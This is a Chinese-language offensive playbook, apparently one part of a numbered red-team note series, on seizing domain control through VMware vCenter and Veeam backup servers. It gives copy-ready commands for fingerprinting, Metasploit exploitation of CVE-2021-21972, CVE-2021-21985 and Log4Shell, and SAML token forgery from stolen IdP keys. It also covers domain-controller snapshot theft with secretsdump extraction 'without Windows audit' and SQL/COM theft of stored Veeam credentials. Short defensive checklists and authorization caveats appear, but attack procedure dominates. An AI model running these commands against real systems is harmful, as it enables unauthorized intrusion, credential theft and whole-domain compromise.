# vCenter 与 Veeam — 虚拟化与备份两大域管捷径

内网两大"一锅端"资产:vCenter 管着全部虚拟机(含域控),Veeam 备份着全部机器(含域控的备份)。vCenter 篇流程:发现指纹(9443/443/5480)→ 按版本选 RCE 路线(msf 五模块选用表)→ 拿下后伪造 SAML 进 vSphere / 离线解 vmdir 全量凭据 → 控制域控虚拟机(快照/控制台,无 Windows 审计)。Veeam 篇流程:定位 Veeam 服务器与 VeeamBackup 库 → nxc mssql 直连查凭据表 → 拿 Veeam 服务器 shell 走 COM 提取会话凭据。命令均可直接复制,占位符用尖括号标注(如 `<vCenter地址>` `<Veeam服务器IP>`);bash 块 = 攻击机 Kali(标注 VCSA 的为 vCenter 设备 shell),msf 模块名/参数全部在本机 `/usr/share/metasploit-framework/modules/` 逐文件核验,nxc 参数为 `--help` 实测,不虚构。

本文件工具:msfconsole(5 个 vCenter 模块 + 2 个提权/旁路模块,文件级核验)、nxc mssql(netexec 1.5.1,详见 14 号)、AADInternals(云侧联动,见 15/24 号)、mimikatz(13 号)。凭据拿到后的域内利用主线见 10 号,Kerberos 见 12 号,Windows 落地侧见 13 号,持久化(Skeleton Key/COM 劫持在 vCenter/域内复用)见 17 号,ADFS SAML 伪造对比见 15 号,代理配置见 99 号。

---

## 发现与指纹 — 9443/443/5480 三端口、/websso 与版本枚举

来源:端口/路径为 vCenter/ESXi 默认安装事实;nmap 脚本 `/usr/share/nmap/scripts/vmware-version.nse`、`http-vmware-path-vuln.nse` 本机存在(实测)

```bash
# ===== 端口速查(vCenter 出现在网段里通常三者齐活或至少 443)=====
# 443   vCenter/ESXi 核心:SOAP API(/sdk)、HTML5 客户端(/ui)、REST(/rest)
# 9443  老版 vSphere Web Client(Flex,6.x 时代;7.0 起逐步废弃)
# 5480  VCSA 设备管理 VAMI(6.5~7.0;8.0 起并入 443 的 /vami)
# 另:902/903 = VMRC 控制台流(后续控制台注入用);427 = SLP(ESXi OpenSLP 老漏洞面)

# ===== 快扫 =====
nmap -p 443,9443,5480,902 -Pn --open <网段CIDR>
nmap -p 443,9443 --script vmware-version,http-title -Pn <vCenter地址>   # vmware-version 直报产品+版本
nmap -p 443 --script http-vmware-path-vuln -Pn <vCenter地址>            # 老路径漏洞探测(ESXi/vSphere)

# ===== curl 指纹与版本枚举 =====
# /ui 301/200 = HTML5 客户端在;顺手看 cookie 里的 vmware-spi 内容
curl -sk -o /dev/null -D - https://<vCenter地址>/ui/ | grep -iE "^HTTP|location|set-cookie"
# SSO IdP 元数据(vsphere.local 为默认 SSO 域;泄露 SAML 端点与证书——后面伪造 SAML 的"对面"长什么样)
curl -sk https://<vCenter地址>/websso/SAML2/Metadata/vsphere.local | head -40
# 经典版本泄露路径:返回 XML 里带 vCenter API 命名空间版本(build 号查公开对照表定补丁状态)
curl -sk https://<vCenter地址>/sdk/vimServiceVersions.xml
# REST 探活:401/405 = /rest 在(登录后才可用,POST /rest/com/vmware/cis/session 换 session)
curl -sk -o /dev/null -w "%{http_code}\n" -X POST https://<vCenter地址>/rest/com/vmware/cis/session
# VAMI(5480):登录页在 = 6.5~7.0 设备;root 弱口令值得一试(管的是整台 VCSA)
curl -sk -o /dev/null -D - https://<vCenter地址>:5480/ | grep -iE "^HTTP|location"

# ===== 拿到凭据后:session 一换,全套 REST 枚举 =====
curl -sk -X POST -u 'administrator@vsphere.local:<密码>' https://<vCenter地址>/rest/com/vmware/cis/session   # 返回 value=会话ID
curl -sk -H "vmware-api-session-id: <会话ID>" https://<vCenter地址>/rest/appliance/system/version            # 精确版本+build
```

参数速查:
- `vmware-version.nse` 直读版本信息(实测存在于 /usr/share/nmap/scripts/)——第一步必跑
- `/websso/SAML2/Metadata/<SSO域>` SSO 域名默认 `vsphere.local`,改名了就先摸 401 响应/证书 CN
- `vimServiceVersions.xml` 给的是 API 版本号,精确 build 用带凭据的 `/rest/appliance/system/version`(登录后),或 VAMI 5480 页面
- build 号→补丁状态:对照 VMware 公开 build 列表(网上查,勿拍脑袋),直接决定第二节选哪条 RCE 路

注意: 9443/5480 常被忘扫;5480 的 VAMI root 一旦弱口令=直接接管整台 vCenter 设备(可开 SSH/进 BASH),是比 RCE 更省事的第一落点;443 上 `/ui` 与 `/websso` 都在但 `/rest` 404 的多是 ESXi 裸主机(无 vCenter),别按 vCenter 套路打;ESXi 的指纹与攻击面单独一段见第四节末尾。

---

## vCenter RCE 四路 — msf 模块按场景选用(五模块全表)

来源:五个模块文件均在 `/usr/share/metasploit-framework/modules/` 本机核验存在,描述/参数/默认值取自模块源码;受影响版本以模块 Description 与厂商 VMSA 为准

**五模块按场景选用表(模块名逐字可用,直接 `use <全名>`):**

| msf 模块 | 类型 | 适用场景 | 前置条件 | 结果 |
|---|---|---|---|---|
| `exploit/multi/http/vmware_vcenter_uploadova_rce` | RCE(CVE-2021-21972) | 老设备(≤7.0 早期)/Windows 版 vCenter | 无需凭据,443 可达 | JSP webshell,`vsphere-ui` 用户权限 |
| `exploit/linux/http/vmware_vcenter_vsan_health_rce` | RCE(CVE-2021-21985) | 6.5/6.7/7.0 未打 2021-05 补丁,装了 vSAN 健康插件 | 无需凭据,443 可达 | 反射+SSRF 落 shell,`vsphere-ui` 用户权限 |
| `exploit/multi/http/vmware_vcenter_log4shell` | RCE(Log4Shell/CVE-2021-44228) | 未打 2021-12 log4j 应急补丁的 6.5/6.7/7.0 | 无需凭据,目标能回连攻击机 LDAP | Linux 设备 root / Windows 版 SYSTEM(模块自起 LDAP 服务,走登录页向量) |
| `auxiliary/admin/vmware/vcenter_forge_saml_token` | 旁路 | 已有 vCenter 文件系统访问(RCE 后/凭据后) | SSO IdP 证书+私钥+VMCA 证书 | 伪造 SAML 换 `/ui` 会话 cookie,以 SSO 域管理员身份进 vSphere |
| `auxiliary/admin/vmware/vcenter_offline_mdb_extract` | 凭据提取 | 已有 vCenter 文件/备份归档访问 | `data.mdb`/`afd.db` 文件 | 从 vmdir/vmafd 库中掏 IdP 签名证书等 → 喂给上一行模块 |

```bash
msfconsole -q
# ===== 路线一:21972 OVA 上传(最经典;修复版本 6.5U3n / 6.7U3l / 7.0U1c,源自模块 Description)=====
use exploit/multi/http/vmware_vcenter_uploadova_rce
set RHOSTS <vCenter地址>
set LHOST <攻击机IP>
# 模块自带 TARGETURI 默认值;公开利用路径为 /ui/vropspluginui/rest/services/uploadova(无需凭据)
run     # Linux 设备落 JSP webshell(vsphere-ui);新版 Linux 设备 webshell 路被堵,Windows 版普遍可用(模块注释原话)

# ===== 路线二:21985 vSAN 健康插件(版本新一点的首选;无需凭据)=====
use exploit/linux/http/vmware_vcenter_vsan_health_rce
set RHOSTS <vCenter地址>
set LHOST <攻击机IP>
run     # 官方测试环境 6.7 U3m(模块 Description);6.5/6.7/7.0 未打 2021-05-25(VMSA-2021-0010)补丁均受影响

# ===== 路线三:Log4Shell(JNDI 注入,自起 LDAP;要求目标能回连)=====
use exploit/multi/http/vmware_vcenter_log4shell
set RHOSTS <vCenter地址>
set SRVHOST <攻击机IP>    # LDAP 服务监听地址
set LHOST <攻击机IP>
run     # 走登录页向量注入(模块 Description);Linux 设备直接 root,Windows 版 SYSTEM——四路里权限最高的

# ===== 路线四:RCE 落地后 90% 只是 vsphere-ui,补一刀本地提权到 root =====
# 本机另核验存在(非本节五模块,同场景配套):
#   exploit/linux/local/vcenter_sudo_lpe                       # vsphere-ui/vmware-user 的 sudo 配置提权
#   exploit/linux/local/vcenter_java_wrapper_vmon_priv_esc     # Java wrapper/vmon 提权
# meterpreter session 在 vCenter 设备上时:run post/multi/recon/local_exploit_suggester 再选上两个
```

版本对应一段(选路速查):拿到 build/版本后——**6.5/6.7/7.0 且 2021 年中前 build** → 先试路线一(21972),打不动(新一点的 Linux 设备 webshell 路被堵)换路线二;**打了 2021-05 补丁但没打 2021-12 log4j 应急补丁** → 路线三 Log4Shell;**版本太新 RCE 全灭** → 别硬打,转凭据/旁路:VAMI 5480 root、vCenter SSO 口令喷洒(administrator@vsphere.local),或免 RCE 的 vmdir 旁路 `auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass`(CVE-2020-3952,直接旁路认证改密建管理员,本机核验存在)+ 配套 `auxiliary/gather/vmware_vcenter_vmdir_ldap`(Dump 全部 LDAP 数据)。

参数速查:
- 三个 exploit 都只需 `RHOSTS`+`LHOST`(Log4Shell 加 `SRVHOST`),全部无需凭据
- `vcenter_forge_saml_token` 选项(源码实测):`USERNAME`(默认 administrator)/`DOMAIN`(默认 vsphere.local)/`VHOST`(vCenter FQDN)/`VC_IDP_CERT`/`VC_IDP_KEY`(IdP 证书+私钥)/`VC_VMCA_CERT`;设计为从 vCenter 上的 meterpreter/shell 会话里跑(SessionTypes 实测)
- `vcenter_offline_mdb_extract` 选项(源码实测):`VMDIR_MDB`(data.mdb 路径)/`VMAFD_DB`(afd.db 路径)/`VC_IP`(给 loot 挂 IP,可选),两文件给其一即可,接受备份归档里的文件
- 提权两模块属 meterpreter post 场景,`set SESSION <id>` 后 run

注意: 21972/21985 落的是 `vsphere-ui` 低权用户,**别忘了路线四的提权**,低权 shell 读不到 SSO 私钥(下一节要用的材料就在受限目录);Log4Shell 需要 LDAP 回连,目标出网受限时先通隧道(06);打之前 `check` 一发(模块多数支持),炸一台 vCenter = 全虚拟化平台瘫痪,生产环境先确认授权范围与回滚;拿下后第一件事把 vCenter 里"ESXi 主机列表+虚拟机清单"导出来——域控虚拟机名字记下,第四节要用。

---

## 拿下后横向 — 伪造 SAML 入 vSphere 与离线解 vmdir 全量凭据

来源:两模块用法/文件路径取自模块源码 Description(`/storage/db/vmware-vmdir/data.mdb`、`/storage/db/vmware-vmafd/afd.db` 原文);vmdir 内容构成为公开研究结论(见模块 References 的 Horizon3 文章),以实机导出为准

```bash
# ===== 路线 A:有 shell(哪怕低权读到文件)→ 提文件 → 离线掏证书 → 伪造 SAML =====
# 1) VCSA 设备 shell(BASH):把两个库文件拖回来(有 root/可读权限时;备份归档里的同款文件也行)
#    /storage/db/vmware-vmdir/data.mdb   ← vmdir,含 IdP 签名凭据 + SSO 全部条目
#    /storage/db/vmware-vmafd/afd.db     ← vmafd,含 vCenter 证书库(VMCA 链)
tar czf /tmp/vc-db.tgz /storage/db/vmware-vmdir/data.mdb /storage/db/vmware-vmafd/afd.db

# 2) 攻击机:离线扫库拿证书/私钥(不碰生产,文件级操作)
msfconsole -q
use auxiliary/admin/vmware/vcenter_offline_mdb_extract
set VMDIR_MDB /tmp/data.mdb
set VMAFD_DB /tmp/afd.db
set VC_IP <vCenter地址>      # 可选,给 loot 归档
run     # 证书/私钥进 loot;没有 msf 时公开思路:binwalk 直接从 data.mdb 里抠证书块(模块 Description 原文思路)

# 3) 伪造 SAML 令牌换 /ui 管理员会话——不用知道任何密码
use auxiliary/admin/vmware/vcenter_forge_saml_token
set VHOST <vCenter的FQDN>
set USERNAME administrator      # 默认即 administrator,可改任意 SSO 用户
set DOMAIN vsphere.local        # 目标实际 SSO 域
set VC_IDP_CERT <loot里的idp证书>
set VC_IDP_KEY  <loot里的idp私钥>
set VC_VMCA_CERT <loot里的vmca证书>
run     # 输出可直接用的 /ui 会话 cookie → 浏览器带上即以 vSphere 管理员身份进 HTML5 客户端

# ===== 路线 B:mdb 里不止证书——vmdir 是台"凭据库" =====
# data.mdb(=vmdir LDAP 数据库)公开研究结论:除 IdP 证书外还含
#   · SSO 用户(本地 SSO 账户,含 administrator)
#   · ESXi 主机条目与其 root 凭据哈希 —— 破一个 = 管全部 ESXi(vCenter 纳管的每台)
#   · 集成 AD 时的服务账号/机器账户(凭据里挖"域管或机器账户"就看这里)
# 实操:离线 mdb_extract 之外,若 vmdir 389/636 可达且拿到任意 SSO 凭据,直接 ldapsearch 枚举:
ldapsearch -x -H ldaps://<vCenter地址> -D 'cn=<SSO用户>,cn=users,dc=vsphere,dc=local' -w '<密码>' \
  -b 'dc=vsphere,dc=local' '(objectClass=*)' dn | head -50      # 条目 DN 结构以实机为准
```

参数速查:
- forge_saml 走的是"IdP 私钥签发 SAML 断言"——与 15 号文档 ADFS 黄金票据同一套原理(拿 IdP 签名材料 → 自签断言 → 服务端照单全收),vCenter 场景材料在 data.mdb,ADFS 场景在 DKM 容器,互相对照着记
- SAML 会话 cookie 走 HTTPS `/ui`,不触发任何 Windows/域侧审计;vCenter 自身日志(如 vmdird/vsphere-ui)留在设备,收尾时注意
- mdb_extract 接受备份归档里的文件——Veeam 备份了 vCenter 的话(第五节),等于备份系统反过来给攻击者递 vCenter 凭据库

注意: 拿到 ESXi root 哈希后 hashcat 模式见 04;ESXi 的 root 哈希格式不是标准 NTLM,查 04/hashcat 例库再跑,别拿 1000 硬怼;从 vmdir 挖到的 AD 服务账号(常见 vCenter 用 AD 集成认证的绑定账号、备份代理账号)直接进 10 号凭据台账 `~/tools/bin/log-cred.sh` 登记,优先验证——这类账号常年高权限低轮换;机器账户可走 12 号的机器账户票据路线(RBCD 等,12 号有全集)。伪造 SAML 前先确认 SSO 域名(第一节 /websso 元数据里看过),`DOMAIN` 填错签出来的断言对不上,直接 401。

---

## vCenter→城内 — 域控快照/控制台注入,无审计拿 DC;ESXi 勒索(勿做)防御提示

来源:快照/控制台为 vSphere 平台原生管理功能(默认 vCenter 管理员即可用);ntds.dit 离线提取联动 10 号阶段 4;ESXiargs 勒索家族行为为公开报道事实

```bash
# ===== 为什么这条路快:全部操作在 hypervisor 层完成,域控 Windows 侧零事件日志 =====
# (4624/4768/4769 一条不落——对比 DCSync 的 4662、黄金票据的 TGS 异常,快照路线干净得多)

# ===== 路线一:域控虚拟机快照 → 下载 → 离线解(首选,只读、可回滚、无痕)=====
# 1) 带伪造 SAML cookie(上一节)或 vCenter 管理员凭据进 HTML5 客户端 /ui
#    右键域控 VM → 快照(内存快照勾上=连内存一起抓,lsass/ntds 现场全保留)
# 2) 开 datastore browser,把快照落盘文件拖回:
#    <VM>-<snapshot序号>.vmdk/.vmsn/.vmem —— vmem 是内存,ntds.dit 在盘里
# 3) 攻击机离线解(工具与完整流程见 10 号阶段 4、13 号):
#    盘:vmdk 挂载 → 拷 ntds.dit+SYSTEM → impacket-secretsdump 离线解(等价 DCSync,零域审计)
qemu-nbd --read-only --connect /dev/nbd0 <域控快照盘>-flat.vmdk   # 需要 nbd 内核模块;只读挂载防锁
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL          # 全域哈希落袋
#    内存:vmem 用 volatility 系列扫 lsass/明文凭据(思路;Kali 源内有 volatility3)

# ===== 路线二:控制台注入(快照被监控/改动敏感时)=====
# VMRC(902/903)或 /ui 网页控制台 → 对域控按 Ctrl+Alt+Del(网页端有组合键按钮)
# 思路:挂载 ISO 进恢复环境改 SAM/替换 utilman 等离线改密手法 = 物理接触等价,但改密码会留痕(通知/失效),
# 授权红队里快照路线通常更合规;控制台路线留给"必须交互登录"的场景
# ESXi 直连场景同构:拿到 ESXi root(上一节 vmdir 哈希破出来的)→ https://<ESXi>/ui 或 ssh 同样能快照/控制台
```

ESXi 勒索防御提示(勿做):近年 ESXiargs 系勒索家族正是走"ESXi root(vCenter/ESXi 漏洞或弱口令)→ SSH 开启 → 锁定/加密 `.vmdk`/`.vmx`(锁文件 + 改扩展名 + 留勒索信)→ 虚拟机成批僵死"的路线,ESXi 6.x 因超期服役与 OpenSLP RCE(CVE-2021-21974,427 端口,公开 PoC 非本机)成为重灾区。**授权渗透里绝对禁止任何加密/锁文件/毁坏动作**——渗透侧只做到"证明能开 SSH、能写 datastore"即止损;防御侧对照:ESXi 打补丁或封 427、SSH 平时关、vCenter/ESXi root 强制强口令+锁定策略、**备份系统(Veeam)与虚拟化平台物理/网络隔离**——勒索第一刀通常就是先删备份;快照异常创建/批量 vmdk 改名应进 SIEM 告警。

参数速查:
- 快照路线文件对应:vmsn=快照状态盘、vmem=内存镜像、-flat.vmdk=数据盘;域控多盘时挑"系统盘+内存"
- `impacket-secretsdump -ntds ... -system ... LOCAL` 离线解全域哈希,拿到后按 10 号凭据台账登记、12 号票据利用
- 控制台注入需要 VMRC 902/903 可达(第一节扫过);网页控制台走 443 更稳

注意: 快照会吃 datastore 空间与 IO,生产域控做内存快照前评估(授权书里写清楚"允许快照");下载 vmdk/vmem 是大流量,过隧道慢就压缩后走 HTTP(13 号隧道下载小节);快照用完删除(留在平台上的快照本身是"有人动过"的痕迹);这条路线拿到的是**哈希+内存现场**,后续 krbtgt/域管利用全在 10/12,不在本文件展开;平台层痕迹(ESXi /var/log、vCenter tasks)会记录快照/下载动作——"无审计"仅指 Windows 域内,平台层痕迹收尾时评估是否可接受。

---

## Veeam — nxc mssql 连 VeeamDB:凭据表查询与 COM 会话凭据提取

来源:nxc mssql 参数为 `nxc mssql --help` 本机实测(`-q/--query`、`--database [NAME]`);VeeamBackup 库 `[dbo].[Credentials]` 表与 `Veeam.Backup.Manager` COM 为公开研究结论(列名/过程名拿不准一律写思路,以实机为准);两个公开工具名为社区已知项目,非本机、未实测

```bash
# ===== 定位 Veeam =====
# Veeam Backup & Replication 服务器:9392(控制台端口,仅做指纹);其 VeeamBackup 数据库跑在
# 同机或邻近的 MSSQL 上(默认实例 1433 直连,命名实例走 UDP 1434 问 SQL Browser——14 号发现小节)
nmap -p 9392,1433 -Pn --open <网段CIDR>
nmap -sU -p 1434 --script ms-sql-info <Veeam服务器IP>

# ===== 凭据从哪来:拿下 vCenter(第二、三节)常见连锁——Veeam 用 vCenter 凭据做备份,
# 反过来 vmdir/机器里的服务账号也常是 Veeam 的 SQL 登录;域凭据可直接打 SQL Windows 验证 =====
nxc mssql <Veeam服务器IP> -u <用户> -p '<密码>' --database              # 先列库,认出 VeeamBackup
nxc mssql <Veeam服务器IP> -u <用户> -p '<密码>' --database VeeamBackup   # 列表,按语义找 Credentials 等业务表

# ===== 两条经典 SQL(列名不虚构——拿不准就 SELECT * 看真实结构再取列)=====
# SQL-1:凭据表。Veeam 把备份作业里存的 vCenter/ESXi/域账号/Linux SSH 凭据集中加密存这张表(公开共识)
nxc mssql <Veeam服务器IP> -u <用户> -p '<密码>' -q "SELECT * FROM [VeeamBackup].[dbo].[Credentials]"
#   password 列是 Veeam 自有格式密文(非裸 DPAPI),两条解密思路——
#   思路①(usp):VeeamBackup 库自带的存储过程/内部解密链曾被公开 writeup 用于以库内对象解密同库密文;
#               环境差异大,`--database VeeamBackup` 后从 sys.procedures 里找 Credentials/加密相关的项试,
#               过程名不写死,拿不准就放弃转思路②
#   思路②(更稳,见下 PowerShell 块):不解 SQL 密文,上 Veeam 服务器本体走 COM 提明文
# SQL-2:摸库结构,表名以实机输出为准(版本差异会改表):
nxc mssql <Veeam服务器IP> -u <用户> -p '<密码>' -q "SELECT name FROM [VeeamBackup].sys.tables"
```

```powershell
# ===== 更好的路:Veeam 服务器 shell → Veeam.Backup.Manager COM 提取会话凭据(明文) =====
# 原理:Veeam 服务进程持有运行中作业的凭据句柄,COM 接口 Veeam.Backup.Manager 提供官方查询面,
# 本机进程内调用即拿到明文;已有公开工具(非本机、未实测,取用前自行审计源码):
#   · Veeam-Get-Creds(PowerShell)—— 经 Veeam.Backup.Manager 拉会话凭据
#   · VeeamCredentialThief(C#)—— 同思路,进程内调用 COM 导出凭据
# 使用前提:已在 Veeam 服务器拿到 shell(通常=域内立足后打 Veeam 服务器本体,文件传输见 13 号,免杀见 20 号)
# 提取到的 vCenter/域账号明文凭据直接进 10 号凭据台账
# (思路段:不虚构具体 COM 方法名;公开工具已封装好调用链,读它的源码照抄即可)
```

防御视角(给蓝队对照,亦是红队自检清单):Veeam 服务器是"域管凭据集合体"——它必然存着 vCenter、ESXi、域账号、存储的多组高权凭据,应视同 Tier-0 管理:① VBR 服务器进敏感资产隔离段,SQL 1433/1434 不对普通网段开放;② 备份数据库账号最小权限,禁 sa 直管 VeeamBackup;③ 备份存储与虚拟化平台隔离(勒索第一目标,呼应第四节);④ 定期轮换备份作业内嵌凭据(渗透侧结论:Credentials 表里的密码平均寿命=作业寿命);⑤ 对 VeeamBackup 库的非常规 SELECT、Veeam.Backup.Manager COM 的异常实例化做检测(思路级)。

参数速查:
- `nxc mssql -q`/`--database` 全参数与撞库防锁见 14 号(本文件不重复展开)
- 9392 = Veeam 控制台端口,仅做存在性指纹;真正入口是 1433 的 VeeamBackup 库或服务器本体 shell
- COM 路线产出**明文**,SQL 路线产出**密文+待解**——有服务器 shell 就直走 COM

注意: Veeam 版本差异会改表结构(高版本有拆库/改列的历史),`[dbo].[Credentials]` 打不出列名来别硬猜,`--database VeeamBackup` 列全表后按语义找(名字带 cred 的表可能不止一张);SQL 登录失败会写 MSSQL ERRORLOG(14 号 OPSEC 小节),撞库节流;从 Veeam 提到的凭据质量极高(vCenter 管理员、域备份账号、服务账号),每一条都 `log-cred.sh` 登记(10 号),优先验证 vCenter 回打闭环(本文件第二、三节)与域内横向(10 号);备份文件本身(VBK)里就是域控的整盘拷贝——拿到备份存储读权限时,VBK 拖回来挂载解 ntds.dit,与第四节快照路线同效。
